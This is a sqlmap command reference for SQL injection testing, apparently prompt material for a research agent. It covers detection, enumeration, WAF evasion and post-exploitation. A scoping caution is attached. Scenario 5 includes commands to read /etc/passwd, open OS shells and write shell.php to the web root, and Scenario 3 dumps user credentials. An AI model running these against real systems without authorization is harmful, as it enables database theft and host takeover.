# sqlmap — command scenarios for deep research

Installed build: sqlmap 1.9.6#stable. Flags come from [`help.txt`](help.txt)
and [`help-advanced.txt`](help-advanced.txt). Commands assume an authorized
target and `--batch` for reproducibility.

> **High impact:** sqlmap can dump, modify, and delete data, and `--os-shell`
> can execute commands on the database host. Use only within written scope.

## How to invoke

```text
@deep-research Which sqlmap detection level, risk, and technique set gives a
defensible SQLi verdict with the least data modification on a modern
ORM-backed application, and how should false positives from time-based tests
be ruled out? Cite the sqlmap wiki, DBMS documentation, and field reports;
return a test plan with a stop condition and an evidence format.
```

Prepare the engagement directory:

```bash
mkdir -p ~/sqlmap-demo/evidence
```

## Scenario 1 — establish the request

The quality of the request determines the quality of the test. Start from the
exact request the application sends, including cookies and headers.

| # | Command | How to use |
|---|---------|------------|
| 1 | `sqlmap -u 'http://target/item.php?id=1' --batch` | Basic GET |
| 2 | `sqlmap -u 'http://target/login' --data 'user=u&pass=p' --batch` | POST body |
| 3 | `sqlmap -r ~/sqlmap-demo/request.txt --batch` | Raw request from Burp |
| 4 | `sqlmap -u 'http://target/item.php?id=1' --cookie 'SESSION=abc' --batch` | Authenticated GET |
| 5 | `sqlmap -u 'http://target/item.php?id=1' --headers 'X-Forwarded-For: 127.0.0.1' --batch` | Custom header |
| 6 | `sqlmap -u 'http://target/item.php?id=1' --forms --batch` | Parse and test forms |

**Research questions**
- Does the request reproduce the application's real headers and cookies?
- Which parameter is dynamic, and which are static?
- Does the endpoint require CSRF or anti-automation tokens?

**Sources:** Burp/ZAP request export; application docs; sqlmap wiki.
**Output:** a saved `request.txt` plus the exact command that reproduces it.

## Scenario 2 — detection with bounded risk

Use the lowest level and risk that answer the question. Raise them only when the
first pass is inconclusive and the scope allows it.

| # | Command | How to use |
|---|---------|------------|
| 7 | `sqlmap -u 'http://target/item.php?id=1' --batch --level 1 --risk 1` | Baseline |
| 8 | `sqlmap -u 'http://target/item.php?id=1' --batch --level 2 --risk 1` | More parameters/headers |
| 9 | `sqlmap -u 'http://target/item.php?id=1' --batch --level 3 --risk 2` | Deeper, moderate risk |
| 10 | `sqlmap -u 'http://target/item.php?id=1' --batch --technique BEU` | Boolean/error/union only |
| 11 | `sqlmap -u 'http://target/item.php?id=1' --batch --technique T --time-sec 3` | Time-based only |
| 12 | `sqlmap -u 'http://target/item.php?id=1' --batch --dbms mysql` | Skip DBMS fingerprinting |

**Research questions**
- Which technique produces the first reliable positive?
- How many requests does each level add, and what is the runtime?
- Does a time-based positive reproduce with a different `--time-sec`?

**Sources:** sqlmap wiki detection section; server logs; request counts.
**Output:** a verdict table with technique, payload, and confidence.

## Scenario 3 — enumerate without over-collecting

Enumeration should answer a specific question: which database, which table,
which columns, how many rows. Stop at the minimum needed for the finding.

| # | Command | How to use |
|---|---------|------------|
| 13 | `sqlmap -u 'http://target/item.php?id=1' --batch --banner --current-user --current-db` | Identity and DBMS |
| 14 | `sqlmap -u 'http://target/item.php?id=1' --batch --is-dba --privileges` | Privilege check |
| 15 | `sqlmap -u 'http://target/item.php?id=1' --batch --dbs` | Database list |
| 16 | `sqlmap -u 'http://target/item.php?id=1' --batch -D appdb --tables` | Tables in one DB |
| 17 | `sqlmap -u 'http://target/item.php?id=1' --batch -D appdb -T users --columns` | Columns |
| 18 | `sqlmap -u 'http://target/item.php?id=1' --batch -D appdb -T users -C username,password --dump --start 1 --stop 10` | Bounded dump |

**Research questions**
- Which database is the application actually using?
- Does the current user have DBA or file privileges?
- What is the smallest dump that proves exposure without collecting unnecessary
  personal data?

**Sources:** sqlmap wiki enumeration; DBMS metadata docs.
**Output:** a bounded result set and a data-minimization note.

## Scenario 4 — WAF, pacing, and evasion

Evasion is about completing a legitimate test, not hiding from authorization.
Record every deviation from the baseline.

| # | Command | How to use |
|---|---------|------------|
| 19 | `sqlmap -u 'http://target/item.php?id=1' --batch --delay 1 --random-agent` | Slow, random UA |
| 20 | `sqlmap -u 'http://target/item.php?id=1' --batch --tamper=space2comment` | One tamper script |
| 21 | `sqlmap -u 'http://target/item.php?id=1' --batch --tamper=space2comment,between` | Stacked tampers |
| 22 | `sqlmap -u 'http://target/item.php?id=1' --batch --proxy http://127.0.0.1:8080` | Inspect via Burp |
| 23 | `sqlmap -u 'http://target/item.php?id=1' --batch --chunked --hpp` | Chunked / HPP |
| 24 | `sqlmap -u 'http://target/item.php?id=1' --batch --parse-errors` | Surface DBMS errors |

**Research questions**
- Which tamper script is compatible with the detected DBMS?
- Does the WAF block payloads, rate, or the session?
- Does `--parse-errors` reveal a DBMS error the normal response hides?

**Sources:** sqlmap tamper list; WAF vendor docs; response comparisons.
**Output:** a before/after block table and the exact tamper used.

## Scenario 5 — post-exploitation (only if explicitly in scope)

These actions change the host or read files outside the database. They are not
detection checks.

| # | Command | How to use |
|---|---------|------------|
| 25 | `sqlmap -u 'http://target/item.php?id=1' --batch --file-read=/etc/passwd` | Read a file |
| 26 | `sqlmap -u 'http://target/item.php?id=1' --batch --sql-shell` | Interactive SQL |
| 27 | `sqlmap -u 'http://target/item.php?id=1' --batch --os-cmd='id'` | One OS command |
| 28 | `sqlmap -u 'http://target/item.php?id=1' --batch --os-shell` | Interactive OS shell |
| 29 | `sqlmap -u 'http://target/item.php?id=1' --batch --file-write=shell.php --file-dest=/var/www/shell.php` | Write a file |

**Research questions**
- Does the DBMS user have the privilege the action requires?
- What is the least invasive proof of impact?
- How will the change be reverted and recorded?

**Sources:** DBMS privilege docs; engagement rules of engagement.
**Output:** a minimal proof (e.g. `id` output) and a cleanup note.

## Scenario 6 — evidence and reproducibility

Save the request, the command, the session, and the HTTP traffic. A finding
without a reproducible request is hard to defend.

| # | Command | How to use |
|---|---------|------------|
| 30 | `sqlmap -u 'http://target/item.php?id=1' --batch --output-dir ~/sqlmap-demo/evidence --har ~/sqlmap-demo/evidence/traffic.har` | Logs + HAR |
| 31 | `sqlmap -u 'http://target/item.php?id=1' --batch --flush-session` | Re-test from clean state |
| 32 | `sqlmap -u 'http://target/item.php?id=1' --batch --answers 'follow=N'` | Scripted answers |
| 33 | `sqlmap -u 'http://target/item.php?id=1' --batch -v 3` | Verbose request/response |
| 34 | `sqlmap -u 'http://target/item.php?id=1' --batch --offline` | Use cached data only |

**Research questions**
- Does the HAR contain the exact payload that triggered the finding?
- Can a second tester reproduce the verdict from the saved request?
- Does `--flush-session` change the result, and why?

**Sources:** sqlmap output directory; HAR viewer; second-run comparison.
**Output:** an evidence bundle with request, command, HAR, and verdict.
